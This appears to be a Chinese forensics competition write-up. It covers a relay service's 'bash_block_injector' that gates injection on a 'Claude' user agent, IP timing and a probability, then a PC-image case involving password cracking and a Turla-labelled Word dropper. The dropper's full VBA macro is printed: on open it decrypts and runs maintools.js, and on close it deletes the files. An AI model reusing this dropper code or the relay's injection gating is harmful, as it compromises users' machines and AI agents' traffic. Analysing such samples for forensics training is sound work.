+
+  // 粗扫
+  let round = 1;
+  for (let delay = START; delay <= END; delay += STEP) {
+    const hits = await runOneDelay(delay, round++);
+    console.log(`${delay}ms -> ${hits}`);
+    results.push({ delay, hits });
+  }
+
+  console.log('\n===== summary =====');
+  console.log(results);
+
+  // 找“最后一个有命中”和“第一个0命中”
+  let lastPositive = null;
+  let firstZeroAfterPositive = null;
+
+  for (const r of results) {
+    if (r.hits > 0) lastPositive = r.delay;
+    if (lastPositive !== null && r.delay > lastPositive && r.hits === 0) {
+      firstZeroAfterPositive = r.delay;
+      break;
+    }
+  }
+
+  console.log('\nlastPositive =', lastPositive);
+  console.log('firstZeroAfterPositive =', firstZeroAfterPositive);
+
+  if (lastPositive !== null && firstZeroAfterPositive !== null) {
+    const mid = (lastPositive + firstZeroAfterPositive) / 2;
+    const rounded = Math.round(mid / 100) * 100;
+    console.log('\n估计阈值(四舍五入到整百ms) =', rounded);
+  } else {
+    console.log('\n粗扫没找到清晰临界区，请缩小步长重扫。');
+  }
+})();
+EOF
+运行：
+/home/zaoqiwang/.local/share/fnm/node-versions/v24.14.1/installation/bin/node /tmp/test_threshold.js
+===== summary =====
+[
+  { delay: 0, hits: 10 },   { delay: 20, hits: 5 },
+  { delay: 40, hits: 9 },   { delay: 60, hits: 6 },
+  { delay: 80, hits: 3 },   { delay: 100, hits: 9 },
+  { delay: 120, hits: 3 },  { delay: 140, hits: 6 },
+  { delay: 160, hits: 11 }, { delay: 180, hits: 3 },
+  { delay: 200, hits: 5 },  { delay: 220, hits: 6 },
+  { delay: 240, hits: 8 },  { delay: 260, hits: 10 },
+  { delay: 280, hits: 9 },  { delay: 300, hits: 6 },
+  { delay: 320, hits: 8 },  { delay: 340, hits: 10 },
+  { delay: 360, hits: 8 },  { delay: 380, hits: 5 },
+  { delay: 400, hits: 6 },  { delay: 420, hits: 4 },
+  { delay: 440, hits: 7 },  { delay: 460, hits: 5 },
+  { delay: 480, hits: 10 }, { delay: 500, hits: 0 },
+  { delay: 520, hits: 0 },  { delay: 540, hits: 0 },
+  { delay: 560, hits: 0 },  { delay: 580, hits: 0 },
+  { delay: 600, hits: 0 },  { delay: 620, hits: 0 },
+  { delay: 640, hits: 0 },  { delay: 660, hits: 0 },
+  { delay: 680, hits: 0 },  { delay: 700, hits: 0 },
+  { delay: 720, hits: 0 },  { delay: 740, hits: 0 },
+  { delay: 760, hits: 0 },  { delay: 780, hits: 0 },
+  { delay: 800, hits: 0 },  { delay: 820, hits: 0 },
+  { delay: 840, hits: 0 },  { delay: 860, hits: 0 },
+  { delay: 880, hits: 0 },  { delay: 900, hits: 0 },
+  { delay: 920, hits: 0 },  { delay: 940, hits: 0 },
+  { delay: 960, hits: 0 },  { delay: 980, hits: 0 },
+  { delay: 1000, hits: 0 }
+]
+
+lastPositive = 480
+firstZeroAfterPositive = 500
+
+估计阈值(四舍五入到整百ms) = 500
+500
+29.接上题，在UA条件和IP时间条件均满足的前提下，函数仍有一定概率返回false。请编写脚本估算触发概率，并推算概率1/N（即理论上平均每N次满足前两个条件的调用才触发一次】。【答案格式：10，格式只保留整十】【提示：建议样本量不少于10000次有效检测（UA条件满足+IP时间条件满足），不然四舍五入会出现进位问题。】
+固定用已经验证能过 UA 过滤的关键词，比如：Claude
+并且把
+IP 时间条件锁死为“必满足”
+：
+每次实验都用一个
+全新 IP
+对这个 IP
+先调用一次
+should_inject_for_ua(ua, ip)
+，只为写入时间戳
+立刻第二次调用
+，这次就是“有效检测”
+统计第二次返回
+true
+的次数
+这样就把前两个条件都固定住了，剩下看到的
+true/false
+就主要是
+概率门
+cat
+>
+/tmp/test_probability.js
+<<
+'EOF'
+const wasm = require('/home/zaoqiwang/claude-relay-service/src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js');
+
+const UA = 'Claude';      // 也可以换 openclaw
+const TOTAL = 20000;      // >=10000，建议 20000 更稳
+
+let hits = 0;
+
+for (let i = 0; i < TOTAL; i++) {
+  const ip = `p.${i}.0.1`;
+
+  // 第一次：满足“同一IP上次请求距今足够近”的前置写入
+  wasm.should_inject_for_ua(UA, ip);
+
+  // 第二次：有效检测
+  if (wasm.should_inject_for_ua(UA, ip)) {
+    hits++;
+  }
+}
+
+const p = hits / TOTAL;      // 触发概率
+const N = TOTAL / hits;      // 理论平均每 N 次触发一次
+const roundedN = Math.round(N / 10) * 10;
+
+console.log('UA =', UA);
+console.log('TOTAL =', TOTAL);
+console.log('hits =', hits);
+console.log('p =', p);
+console.log('N =', N);
+console.log('rounded N =', roundedN);
+EOF
+/home/zaoqiwang/.local/share/fnm/node-versions/v24.14.1/installation/bin/node /tmp/test_probability.js
+UA
+=
+Claude
+TOTAL
+=
+20000
+hits
+=
+412
+p
+=
+0.0206
+N
+=
+48.54368932038835
+rounded N
+=
+50
+答案：50
+0x03 计算机取证
+早起王
+检材：早起王的PC镜像.E01；早起王的U盘.dd
+30.请分析早起王的PC镜像，计算机系统 Build 版本是什么？【答案格式：12345.1234】【提示：仿真蓝屏是因存在 OSDATA 文件，删除后即可正常仿真 】
+FTK 挂载，找到这个文件：
+Windows\System32\config\SOFTWARE
+，然后用
+Registry Explorer
+打开这个
+SOFTWARE
+hive
+Microsoft
+→
+Windows NT
+→
+CurrentVersion
+CurrentBuild.UBR
+19045.6466
+31.请分析早起王的PC镜像，用户深情专一沼气王，她是我的生死劫的登陆密码 LM 哈希值后六位？【答案格式：abc123】
+1404ee
+32.请分析早起王的PC镜像，沼气王的桌面有本日记，请问沼气王暗恋对象的生日为？【答案格式：05月26日】
+仿真
+找一个
+能挂 ISO、能进文件管理器或命令行
+的 WinPE
+https://github.com/readloud/HBCD-PE-x64-v1.0.2?tab=readme-ov-file
+先从 PE 的 ISO 启动
+，不是从硬盘启动 ，勾选了 **Connected，**勾选了
+Connect at power on
+回车
+主系统盘就是
+C:
+dir C:\*OSDATA* /a /s
+在C:\windows\System32\config下，整个OSDATA文件都删掉
+重选硬盘优先
+越过山丘，确实是早起王的微信哈
+打开日记.doc，发现要密码
+> python
+.
+\office2john
+.
+py
+"J:\日记.docx"
+>
+.
+\office
+.
+hash
+>
+Get-Content
+.
+\office
+.
+hash
+日记
+.
+docx:
+$office
+$
+*
+2007*20*128*16*227f374a6f8fbccc79c7abfe8636ba42*6e9cc0c97f80b20beb97b9afa0c8e448*1fc206f85ba721fb80b93c6bbb8308971caa29fe
+>
+.
+\hashcat
+.
+exe
+-
+m 9400
+-
+a 3
+'$office$*2007*20*128*16*227f374a6f8fbccc79c7abfe8636ba42*6e9cc0c97f80b20beb97b9afa0c8e448*1fc206f85ba721fb80b93c6bbb8308971caa29fe'
+-
+1
+'?l?u?d'
+'?1?1?1?1?104'
+3 月 2 日 晴
+春阳透过图书馆的落地窗，在木质书桌投下斑驳光影。她就坐在斜前方靠窗的位置，扎着低马尾，耳后别着一支银色笔，发梢随着翻书的动作轻轻晃动。我假装查阅专业书，目光却总忍不住越过书页缝隙，落在她认真的侧脸上 —— 睫毛纤长，低头时会轻轻扫过书页，握笔的手指纤细，在笔记本上写着娟秀的字迹。下午公共选修课上，老师提问时她主动举手，声音清亮又温柔，条理清晰地阐述观点，我盯着她被阳光照亮的下颌线，连老师后续补充的知识点都没听清。放学时在图书馆门口撞见，她抱着一摞书，笑着侧身说 “借过”，风里裹挟着她发间淡淡的洗发水清香，我愣在原地，直到她的身影消失在林荫道才反应过来，手心都是暖的。原来喜欢一个人，连偶然的相遇都能成为一整天的快乐源泉。
+3 月 4 日 多云
+今天小组课题讨论，她被分到我们组。约定在教学楼的自习室碰面，她来得很早，正趴在桌上整理资料，校服外套搭在椅背上，穿了件浅色针织衫，显得格外温柔。我故意放慢脚步，把书包轻轻放在她旁边的座位，眼角的余光一直追着她的动作。讨论到中途，她起身去擦白板，踮脚擦高处字迹时，裙摆轻轻晃动，我差点把手里的笔掉在地上。她擦完转身，手里的白板擦不小心蹭到了衣角，自己没发现，还在认真听同学发言。我犹豫了几秒，还是从包里拿出纸巾递过去：“你的衣服沾到墨渍了。” 她惊讶地低头看了看，笑着接过纸巾：“谢谢你呀，都没注意到。” 指尖不小心碰到我的，像电流窜过，我赶紧收回手，假装翻资料，耳朵却烫得厉害。这短暂的互动，够我在睡前反复回味好久。
+3 月 6 日 阴
+气温骤降，早上出门时还飘了几滴小雨。走进教学楼，就看到她裹着一件浅蓝色的厚外套，缩着肩膀快步往前走，像只温顺的小猫。早读课上，她偶尔咳嗽几声，声音带着点沙哑，应该是感冒了。我在书包里翻出备用的润喉糖和一包感冒药，犹豫了一整节课 —— 直接送会不会太突兀？直到课间她去接水，我才鼓起勇气，把东西悄悄放在她的桌角，附上一张没署名的小纸条：“多喝热水，按时吃药，早点好起来呀。” 下午上课前，看到她拆开糖纸，把糖放进嘴里，还和同桌笑着说 “不知道是谁放的，也太贴心了，糖还挺甜”，我趴在桌子上，嘴角忍不住上扬。原来默默为她做一件小事，不用让她知道是谁，就能收获满溢的欢喜。希望这小小的关怀，能让她快点好起来。
+3 月 8 日 晴
+今天是妇女节，校园里的花店摆满了鲜花。她和室友一起，在宿舍楼下的花店买了几支康乃馨，说是要送给辅导员。我看着她们说说笑笑的样子，悄悄绕到花店，选了一小束洋甘菊 —— 花语是 “默默守护”，正好契合我对她的心意。趁她去上课，我把花放进了她的宿舍信箱，还附了一张卡片：“愿你永远被温柔以待，节日快乐。” 放学时，在食堂门口看到她抱着洋甘菊，和室友叽叽喳喳地猜测是谁送的，眼睛亮晶晶的，像藏了星星。“会不会是哪个暗恋你的人呀？” 室友打趣道，她脸颊微红，轻轻捶了室友一下，笑容格外明媚。我躲在不远处的树荫下，心里既紧张又开心，希望这束小花能给她的节日添一份小美好，也希望她永远都这么快乐。
+3 月 10 日 小雨
+下了一上午的小雨，空气湿漉漉的，带着草木的清香。午休时，她没去食堂，坐在图书馆的靠窗位置看书，手里捧着一杯热牛奶，雾气氤氲了她的眼镜片。我假装去书架找书，路过她的座位时，“不小心” 碰掉了她桌角的笔，赶紧弯腰去捡，她也低头帮忙，两人的脑袋差点碰到一起。“不好意思呀，太不小心了。” 我连忙道歉，她笑着摇摇头：“没事没事，不怪你。” 声音软软的，像小雨滴落在心上。我拿着捡起来的笔，心跳得飞快，连声道谢后赶紧溜走。回到自己的座位，盯着那支笔刚才掉落的地方，仿佛还残留着她的气息。窗外的雨还在下，可我的心里却暖暖的，这雨天也因为这场小小的意外，变得格外温柔。
+3 月 12 日 晴
+今天是植树节，学校组织志愿者去郊外的公益林种树。她穿着运动服，扎着高马尾，脸上带着防晒帽，干劲十足的样子。我被分配到她旁边的小组，看着她拿着小铲子挖坑，挖了一会儿就气喘吁吁，额头上渗出汗珠，却还是不肯停下休息。我悄悄走过去，接过她手里的铲子：“我来帮你吧，你歇会儿。” 她惊讶地看着我，然后笑着道谢：“谢谢你呀，你真厉害，挖得又快又深。” 这是她第一次主动跟我说这么多话，我脸颊发烫，只能挠挠头说 “没事，应该的”。种树时，我们一起扶着小树苗，她的手不小心碰到我的胳膊，暖暖的触感让我心跳加速。看着亲手种下的小树苗，在阳光下舒展枝叶，就像我对她的心意，在悄悄生根发芽。希望小树苗能茁壮成长，也希望我的心意，有一天能被她察觉。
+3 月 15 日 多云
+今天概率论小测，我考得一塌糊涂，看着试卷上的红叉，心情低落到了极点。午休时，趴在自习室的桌子上不想动，连晚饭都没胃口去吃。她路过我的座位，看到我皱着眉盯着试卷，犹豫了一下，轻轻敲了敲我的桌子，递过来一张纸条：“一次小测而已，别太难过啦，我这里有整理的知识点笔记，借给你看看？加油，你一定可以的！” 纸条末尾还画了一个小小的笑脸。看着那张字迹娟秀的纸条，心里的阴霾瞬间散去，只剩下满满的温暖。我抬头看向她，她正在座位上认真做题，侧脸线条柔和，阳光落在她的发梢，泛着淡淡的金光。原来她不仅温柔，还这么善良细心，这样的她，让我越来越喜欢。我把纸条小心翼翼地夹在课本里，当作珍贵的宝藏，也暗暗下定决心，下次一定要考个好成绩，不让她失望。
+3 月 17 日 晴
+今天体育课是自由活动，女生们在操场边跳长绳，她跳得特别好，像一只轻盈的小鹿，头发随着跳跃的动作飞扬，笑声清脆得像风铃。我和室友在旁边打篮球，目光却总忍不住追着她的身影，好几次传球都差点失误，被室友调侃 “心不在焉”。休息时，她坐在操场边的台阶上喝水，额头上带着薄汗，脸颊泛红。我鼓起勇气，跟室友说了声 “去买水”，就跑到校门口的便利店，买了一瓶她常喝的冰红茶，快步走到她面前，结结巴巴地说：“这瓶…… 给你，天挺热的，补充点水分。” 她惊讶地看着我，眼睛睁得圆圆的，然后接过饮料，笑着说 “谢谢你呀”，眼睛弯成了月牙。我转身跑开，心脏还在砰砰直跳，手里仿佛还残留着饮料瓶的温度。这大概是我最勇敢的一次，希望她能感受到我藏在饮料里的心意。
+3 月 19 日 阴
+还有五天就是她的生日了，我开始偷偷准备礼物。想了好久，最终决定送她一本精装的诗集 —— 她平时很喜欢泡在图书馆，尤其爱读诗歌，上次还看到她在看叶芝的诗集。我在网上挑选了很久，选了一本带插画的版本，扉页上用娟秀的字迹写了一句诗：“你是落在我世界里的一束光，温柔了我所有的时光。” 没有署名，只画了一个小小的太阳。晚上回到宿舍，把诗集仔细包装好，外面系了一条她喜欢的浅色系丝带，放在床头。躺在床上，想象着她收到礼物时惊讶又开心的样子，嘴角就忍不住上扬。希望这本诗集，能承载我小心翼翼的心意，也希望她能读懂诗里的温柔。愿她的生日，像诗歌一样美好，愿她永远保持这份热爱生活的模样。
+3 月 21 日 晴
+距离她的生日越来越近，我的心情也越来越激动，连上课都忍不住走神。今天早读课，她坐在靠窗的位置背单词，阳光透过窗户落在她的脸上，长长的睫毛投下淡淡的阴影，鼻尖小巧，嘴唇微微抿着，格外好看。我拿出笔记本，偷偷写下了好多想对她说的话，从第一次在图书馆遇见她的心动，到每次互动的欢喜，写了满满一页，却终究没勇气送出去。课间时，听到她和室友讨论生日要怎么过，说想去学校附近那家新开的甜品店吃蛋糕，还说特别想吃抹茶味的慕斯。我默默记在了心里，立刻拿出手机，提前给甜品店打电话预定了一份抹茶慕斯，备注了生日当天自取。这份默默的惦记，就像一颗甜甜的糖，藏在心里，让人满心欢喜。只希望生日那天，她能吃到喜欢的甜品，拥有一整天的快乐。
+3 月 24 日 阴转晴
+今天是她的生日，也是我最期待的一天。早上特意起得很早，把预定的抹茶慕斯取回来，和准备好的诗集一起放在手提袋里。走到教学楼门口，正好撞见她，她穿了一条白色连衣裙，裙摆上沾了点小小的泥点，应该是路上不小心蹭到的，却显得格外灵动。她看到我，笑着点了点头打招呼，我紧张得手心冒汗，只能僵硬地回应。上课前，我趁教室人少，把礼物悄悄放在她的桌角，然后躲在后门，看着她走进教室，发现礼物时惊讶地睁大眼睛，拆开包装看到诗集和蛋糕，嘴角瞬间扬起灿烂的笑容。午休时，她和室友在宿舍楼下的长椅上分享蛋糕，奶油蹭在嘴角，被室友笑着擦掉，她羞赧地低头笑，眉眼弯弯像盛了星光。晚自习后，我悄悄跟着她走了两条街，看着她安全走进宿舍楼下，直到那扇亮着的窗户透出温暖的光，才转身离开。回到宿舍，写下这篇日记，祝她生日快乐，愿她永远被温柔以待，而我会一直默默守护着她。
+3 月 26 日 多云
+生日过后，她好像变得更开心了，经常能在教学楼、图书馆听到她的笑声。今天概率论课，老师让同桌互相讲解难题，我正好和她分到了一组。她把椅子往我这边挪了挪，拿出自己的笔记，耐心地给我讲题，手指指着课本上的公式，声音温柔又清晰。我看着她认真的样子，长长的睫毛轻轻颤动，气息里带着淡淡的馨香，差点忘了听题，直到她戳了戳我的胳膊，笑着说 “认真听呀，这个知识点很重要”，我才回过神来，赶紧点头。讲完题后，她还特意找了几道类似的题目让我练习，全程陪着我，遇到我不懂的地方，又不厌其烦地重新讲解。这样温柔又有耐心的她，让我越来越深陷。希望以后还有更多这样的机会，能和她近距离相处，一点点靠近她的世界。
+3 月 28 日 晴
+这个月的最后一篇日记，心里满是不舍。今天放学时，在校门口的林荫道上撞见她，她手里拿着我送她的那本诗集，看到我后，笑着朝我走过来：“那个诗集我很喜欢，里面的诗写得特别好，尤其是扉页上的那句话，谢谢你呀。” 原来她知道是我送的，我又惊又喜，脸颊发烫，只能挠挠头说 “你喜欢就好，没打扰到你吧”。“没有呀，反而很惊喜，” 她笑着说，眼睛亮晶晶的，“下次有机会，我们可以一起去图书馆交流诗集呀。” 我愣在原地，直到她挥挥手跟我道别，转身走进人群里，才反应过来 —— 她主动邀请我了！看着她的背影，我心里充满了希望，嘴角忍不住上扬。这个三月，因为有她，变得格外美好。愿四月的阳光更暖，愿我能离她更近一点，愿这份温柔的暗恋，能慢慢开花结果。
+03月24日
+33.请分析早起王的PC镜像，早起王受到过一封邮件，请找出邮件中隐写的秘密【答案格式：xxx，xxx】（
+参考2024强网拟态初赛-PvZ
+）
+桌面有Foxmail，找到文件所在位置C:\MailMasterData\zqw100860312@163.com_8280
+mail.db
+只复制正文 spam 文本 ，但是这里显示不完全，解一下content.db
+import
+sqlite3
+,
+zlib
+
+db
+=
+r"D:\Desktop\content.db"
+# 改成你的路径
+con
+=
+sqlite3
+.
+connect
+(
+db
+)
+con
+.
+text_factory
+=
+bytes
+cur
+=
+con
+.
+cursor
+(
+)
+cur
+.
+execute
+(
+"""
+SELECT OrigBody
+FROM MailContent
+WHERE MailId = 3 AND ContentType = 0
+"""
+)
+data
+=
+cur
+.
+fetchone
+(
+)
+[
+0
+]
+text
+=
+zlib
+.
+decompress
+(
+data
+)
+.
+decode
+(
+"utf-8"
+,
+"ignore"
+)
+print
+(
+text
+)
+https://www.spammimic.com/decode.cgi
+【 SpamMimic 解码 】
+34.请分析早起王的PC镜像，VeraCrypt容器的外层密码是什么？【答案格式：abc123】【提示：分析utools】
+外层
+qq520250520250520250
+35.请分析早起王的PC镜像，早起王设置了一个AI女友，并自行导入过一个角色模型，该模型的原始文件名为？【答案格式：ABC.vrm】
+挂载《嘉宾》这个txt
+MANUKA.vrm
+36.请分析早起王的PC镜像，AI女友使用的模型是什么？【答案格式：openai/GPT5.3-Codex-01-01】
+电脑关机过就会出现
+发现平航仿真软件这边启动才行，醉了，之前总是又仿真一遍（我是笨蛋TwT）
+qwen/qwen3.5-flash-02-23
+37.请分析早起王的PC镜像，该PC中有一个离线大模型软件，其上次对话使用的模型是？【答案格式：ministral-3-14b-reasoning】
+qwen2.5-coder-14b-instruct
+38.请分析早起王的PC镜像，早起王曾删除一个MD5值为49B367AC261A722A7C2BBBC328C32545的恶意文件，请尝试数据恢复并找到其文件名？【答案格式：abc123】
+$root
+=
+'C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory'
+$dirs
+=
+'01'
+,
+'11'
+,
+'20'
+,
+'22'
+$keys
+=
+'49b367ac261a722a7c2bbbc328c32545'
+,
+'Turla'
+,
+'Dropper'
+,
+'Z:\'
+Get-ChildItem
+(
+$dirs
+|
+ForEach-Object
+{
+Join-Path
+$root
+$_
+}
+)
+-
+Recurse
+-
+File
+|
+ForEach-Object
+{
+$bytes
+=
+[System.IO.File]
+::ReadAllBytes
+(
+$_
+.
+FullName
+)
+$text
+=
+(
+[System.Text.Encoding]
+::Unicode
+.
+GetString
+(
+$bytes
+)
++
+"`n"
++
+[System.Text.Encoding]
+::UTF8
+.
+GetString
+(
+$bytes
+)
++
+"`n"
++
+[System.Text.Encoding]
+::ASCII
+.
+GetString
+(
+$bytes
+)
+)
+-replace
+"`0"
+,
+""
+foreach
+(
+$k
+in
+$keys
+)
+{
+if
+(
+$text
+-like
+"*
+$k
+*"
+)
+{
+"==== HIT:
+$
+(
+$_
+.
+FullName
+)
+===="
+$text
+|
+Select-String
+'49b367ac261a722a7c2bbbc328c32545|Turla|Dropper|Z:\\'
+-
+Context 2
+,
+2
+break
+}
+}
+}
+四条记录都重复出现了同一组关键信息：
+威胁名：
+TrojanDropper:O97M/Turla.A!dha
+路径字段：
+fileH Z:\49b367ac261a722a7c2bbbc328c32545
+MD5 字段：
+ThreatTrackingMD5 ... 49b367ac261a722a7c2bbbc328c32545
+这说明 Defender 记录到的
+被检测对象路径
+就是：
+Z:\49b367ac261a722a7c2bbbc328c32545
+所以它的
+文件名
+就是路径最后一段，也就是：
+49b367ac261a722a7c2bbbc328c32545
+看了一下官方的wp
+用隐藏层的密码woaizaoqiwoshenqingzhuanyi挂载
+发现盘里没东西
+diskgenius恢复一下
+MD5一下结果跟上面的一致
+39.接上题，该文件中有多个流（streams）包含宏。请提供其中编号最小的一个。【答案格式：3】
+看 OLE/VBA 流编号 ，用下面这个工具
+https://decalage.info/olefile/
+https://blog.didierstevens.com/programs/oledump-py/
+&
+"F:\ctf_all_in_one\python.exe"
+.
+\oledump
+.
+py
+"E:\oledump\49b367ac261a722a7c2bbbc328c32545"
+1:       114
+'\x01CompObj'
+2:       284
+'\x05DocumentSummaryInformation'
+3:       392
+'\x05SummaryInformation'
+4:      8017
+'1Table'
+5:      4096
+'Data'
+6:       483
+'Macros/PROJECT'
+7:        65
+'Macros/PROJECTwm'
+8: M    7117
+'Macros/VBA/Module1'
+9: m    1104
+'Macros/VBA/ThisDocument'
+10:      3467
+'Macros/VBA/_VBA_PROJECT'
+11:      2964
+'Macros/VBA/__SRP_0'
+12:       195
+'Macros/VBA/__SRP_1'
+13:      2717
+'Macros/VBA/__SRP_2'
+14:       290
+'Macros/VBA/__SRP_3'
+15:       565
+'Macros/VBA/dir'
+16:        76
+'ObjectPool/_1541577328/\x01CompObj'
+17: O   20301
+'ObjectPool/_1541577328/\x01Ole10Native'
+18:      5000
+'ObjectPool/_1541577328/\x03EPRINT'
+19:         6
+'ObjectPool/_1541577328/\x03ObjInfo'
+20:    133755
+'WordDocument'
+M
+/
+m
+都表示这个 stream 里有宏
+编号最小的是：8
+40.接上题，混淆代码的解密密钥是什么？【答案格式：填写传入脚本的实际密钥，不包含命令行分隔空格】
+前面已经跑出来了：
+8: M    7117 'Macros/VBA/Module1'
+真正有代码的一般看
+Module1
+&
+"F:\ctf_all_in_one\python.exe"
+.
+\oledump
+.
+py
+-
+s 8
+-
+v
+"E:\oledump\49b367ac261a722a7c2bbbc328c32545"
+-s 8
+= 看第 8 个 stream
+-v
+= 展开 VBA 宏代码
+也可以用
+&
+"python.exe"
+-
+m oletools
+.
+olevba
+"样本文件路径"
+Attribute VB_Name = "Module1"
+
+' 全局变量
+Public OBKHLrC3vEDjVL As String
+Public B8qen2T433Ds1bW As String
+
+' ==============================================
+' 字节数组异或解密函数
+' ==============================================
+Function Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As Long) As Boolean
+    Dim THQNfU76nlSbtJ5nX8LY6 As Byte
+    THQNfU76nlSbtJ5nX8LY6 = 45
+    
+    For i = 0 To M5wI32R3VF2g5B21EK4d - 1
+        EjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6
+        THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
+    Next i
+    
+    Q7JOhn5pIl648L6V43V = True
+End Function
+
+' ==============================================
+' 文档关闭时自动执行：删除文件
+' ==============================================
+Sub AutoClose()
+    On Error Resume Next
+    Kill OBKHLrC3vEDjVL
+    
+    On Error Resume Next
+    Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
+    R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
+    Set R7Ks7ug4hRR2weOy7 = Nothing
+End Sub
+
+' ==============================================
+' 文档打开时自动执行：释放并运行JS
+' ==============================================
+Sub AutoOpen()
+    On Error GoTo MnOWqnnpKXfRO
+    
+    Dim NEnrKxf8l511
+    Dim N18Eoi6OG6T2rNoVl41W As Long
+    Dim M5wI32R3VF2g5B21EK4d As Long
+    
+    ' 获取文档长度
+    N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
+    NEnrKxf8l511 = FreeFile
+    
+    ' 二进制读取文档内容
+    Open (ActiveDocument.FullName) For Binary As #NEnrKxf8l511
+    Dim E2kvpmR17SI() As Byte
+    ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
+    Get #NEnrKxf8l511, 1, E2kvpmR17SI
+    
+    ' 转字符串
+    Dim KqG31PcgwTc2oL47hjd7Oi As String
+    KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)
+    
+    ' 正则匹配特征标记
+    Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
+    Dim VUy5oj112fLw51h6S
+    Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
+    VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
+    Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)
+    
+    Dim Y5t4Ul7o385qK4YDhr
+    If I4j833DS5SFd34L3gwYQD.Count = 0 Then
+        GoTo MnOWqnnpKXfRO
+    End If
+    
+    ' 获取匹配位置
+    For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
+        Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
+        Exit For
+    Next
+    
+    ' 读取加密数据块
+    Dim Wk4o3X7x1134j() As Byte
+    Dim KDXl18qY4rcT As Long
+    KDXl18qY4rcT = 16827
+    ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
+    Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
+    
+    ' 解密
+    If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
+        GoTo MnOWqnnpKXfRO
+    End If
+    
+    ' 定位输出路径
+    B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
+    Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
+    If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
+        B8qen2T433Ds1bW = Environ("appdata")
+    End If
+    Set R7Ks7ug4hRR2weOy7 = Nothing
+    
+    ' 释放 maintools.js
+    Dim K764B5Ph46Vh
+    K764B5Ph46Vh = FreeFile
+    OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
+    
+    Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
+    Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
+    Close #K764B5Ph46Vh
+    
+    Erase Wk4o3X7x1134j
+    
+    ' 执行 JS 文件
+    Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
+    R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
+    
+    ' 保存并退出
+    ActiveDocument.Save
+    Exit Sub
+
+' 错误处理出口
+MnOWqnnpKXfRO:
+    Close #K764B5Ph46Vh
+    ActiveDocument.Save
+End Sub
+最后这一段就是核心：
+OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
+...
+Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
+R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
+这句拆开看就是：
+OBKHLrC3vEDjVL
+= 脚本路径，也就是
+maintools.js
+"""" + OBKHLrC3vEDjVL + """"
+= 把脚本路径加上双引号
+后面拼接：" EzZETcSXyKAdF_e5I2i1"
+这个就是
+传给脚本的参数
+** EzZETcSXyKAdF_e5I2i1**
+41.接上题，释放并删除的文件是什么？【答案格式：abc.py】
+宏里这几句最关键：
+B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
+...
+OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
+Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
+Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
+Close #K764B5Ph46Vh
+B8qen2T433Ds1bW
+是目录，也就是：
+%appdata%\Microsoft\Windows
+OBKHLrC3vEDjVL
+是完整文件路径，它被拼成了：
+%appdata%\Microsoft\Windows\maintools.js
+Open ... For Binary
++
+Put ...
+说明它把前面解出来的字节数组
+Wk4o3X7x1134j
+写成了一个文件
+所以这里可以确定：**释放出来的文件名就是 **
+**maintools.js**
+再看
+AutoClose()
+：
+Sub AutoClose()
+On Error Resume Next
+Kill OBKHLrC3vEDjVL
+On Error Resume Next
+Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
+R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
+Set R7Ks7ug4hRR2weOy7 = Nothing
+End Sub
+Kill OBKHLrC3vEDjVL
+这里
+OBKHLrC3vEDjVL
+就是前面那个完整路径：
+%appdata%\Microsoft\Windows\maintools.js
+所以这句就是：**删除 **
+**maintools.js**
+DeleteFile B8qen2T433Ds1bW & "\*.*", True
+这句是把那个目录下的文件也一起删
+答案：maintools.js
+42.接上题，该文件用的是什么语言？【答案格式：JavaScript】
+答案：JScript
+对比项
+JavaScript
+JScript
+定义
+网景 (Netscape) 推出的脚本语言，ECMAScript 标准的
+原版实现
+微软为兼容 JS 开发的
+方言实现
+，为规避商标而改名
+归属 / 厂商
+网景 → 后来由 ECMA 标准化
+微软 (Microsoft)
+主要运行环境
+现代浏览器、Node.js、各类前端 / 服务端环境
+老 IE 浏览器、
+WSH(Windows Script Host)
+、ASP
+文件后缀
